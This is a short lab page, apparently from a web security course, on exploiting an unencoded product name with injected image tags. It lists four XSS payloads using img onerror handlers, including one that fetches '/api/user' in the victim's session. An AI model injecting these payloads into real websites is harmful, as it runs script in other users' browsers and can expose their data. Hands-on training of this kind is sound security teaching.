📚 Lab 8.1.B: Image Tag Injection

Upload products to the gallery by injecting malicious image tags. The product name is directly rendered without encoding, allowing you to inject HTML.

💡 Common Image Injection Payloads:

Broken image trigger:

<img src=x onerror=alert('XSS')>

With custom message:

<img src=invalid onerror="alert('Image loaded: ' + this.src)">

Fetch user data:

<img src=x onerror="fetch('/api/user').then(r=>alert(r))">

With event listener:

<img src=x onerror=this.onclick=()=>alert('Click me!')>
